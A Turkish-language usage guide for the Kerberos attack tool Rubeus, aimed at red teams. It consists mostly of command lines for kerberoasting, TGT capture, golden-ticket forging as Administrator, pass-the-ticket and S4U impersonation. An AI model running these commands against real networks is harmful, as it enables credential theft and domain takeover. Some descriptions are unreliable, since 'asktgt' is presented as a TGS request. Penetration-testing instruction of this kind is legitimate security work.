# Rubeus Kullanım Kılavuzu

## Giriş
Rubeus, Kerberos kimlik doğrulama protokolünü manipüle ederek saldırı vektörlerini değerlendirmek için tasarlanmış güçlü bir C# aracıdır. Kırmızı takım faaliyetlerinde ve sızma testlerinde, özellikle Kerberos biletleriyle ilgili işlemleri gerçekleştirmek için yaygın olarak kullanılır.

---

## Gereksinimler
- Windows işletim sistemi
- Komut satırı erişimi
- Yeterli ayrıcalıklara sahip bir kullanıcı hesabı

---

## Özellikler
Rubeus aşağıdaki işlemleri gerçekleştirebilir:
- TGT (Ticket Granting Ticket) ve TGS (Ticket Granting Service) biletlerini isteyip yakalama
- Kerberoasting saldırıları
- Altın/Gümüş Bilet oluşturma
- Bilet yenileme ve iptal etme
- Pass-the-Ticket (Bileti Kullanarak Yetki Yükseltme)
- S4U (Service for User) işlevlerini kullanma

---

## Kullanım
### Yardım Mesajını Görüntüleme
Tüm kullanılabilir komutları ve parametreleri görmek için:
```cmd
Rubeus.exe help
```

### Temel İşlemler

#### 1. TGT Yakalama
Mevcut oturumun TGT bilgisini yakalamak için:
```cmd
Rubeus.exe tgt
```

#### 2. Kerberoasting
Kerberos servis hesaplarının hash’lerini yakalamak için:
```cmd
Rubeus.exe kerberoast
```
Opsiyonel olarak belirli bir SPN (Service Principal Name) belirtilebilir:
```cmd
Rubeus.exe kerberoast /spn:http/webserver.domain.local
```

#### 3. Altın Bilet Oluşturma
Bir Altın Bilet oluşturmak için gereken bilgileri sağlayarak:
```cmd
Rubeus.exe golden /rc4:HASH /user:USERNAME /domain:DOMAIN /sid:DOMAIN_SID
```

#### 4. Bileti Yükleme (Pass-the-Ticket)
Bir Kerberos biletini oturuma yüklemek için:
```cmd
Rubeus.exe ptt /ticket:PATH_TO_TICKET
```

#### 5. S4U2Self ve S4U2Proxy Kullanımı
S4U2Self işlevini kullanarak belirli bir kullanıcı için bilet talep etmek:
```cmd
Rubeus.exe s4u /user:TARGET_USER /rc4:HASH
```
S4U2Proxy ile bilet yükseltmesi yapmak için:
```cmd
Rubeus.exe s4u /impersonateuser:USER /domain:DOMAIN /dc:DC_IP /altservice:cifs
```

---

## Örnek Kullanımlar
### 1. TGT Yakalama ve Saklama
Mevcut oturumun TGT bilgisini yakalamak ve bir dosyaya kaydetmek için:
```cmd
Rubeus.exe tgt /outfile:TGT.kirbi
```

### 2. Hash Yakalama (Kerberoasting)
Etki alanındaki tüm SPN’lere yönelik hash yakalama işlemi:
```cmd
Rubeus.exe kerberoast /outfile:hashes.txt
```

### 3. Altın Bilet ile Yetki Yükseltme
Altın Bilet oluşturup yüklemek:
```cmd
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-1234567890 /ptt
```

### 4. Servis Hesabı Bileti Alma
Belirli bir SPN için TGS talep etmek:
```cmd
Rubeus.exe asktgt /user:SPN_USER /rc4:HASH
```

---

## Güvenlik Notları
Rubeus yalnızca yasal ve etik amaçlarla kullanılmalıdır. Araç, sistem yöneticilerinin Kerberos yapılandırmalarını test etmesine ve güvenlik açıklarını gidermesine yardımcı olmak için tasarlanmıştır. Yetkisiz kullanım yasal sonuçlara yol açabilir.

---

## Kaynaklar
- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Kerberos Belgeleri](https://learn.microsoft.com/en-us/windows-server/identity/kerberos)

---

Bu rehber, Rubeus aracını kullanarak Kerberos protokolü ile ilgili işlemleri gerçekleştirmenin temellerini kapsamaktadır. Daha fazla bilgi veya yardım için yukarıdaki kaynakları ziyaret edin.
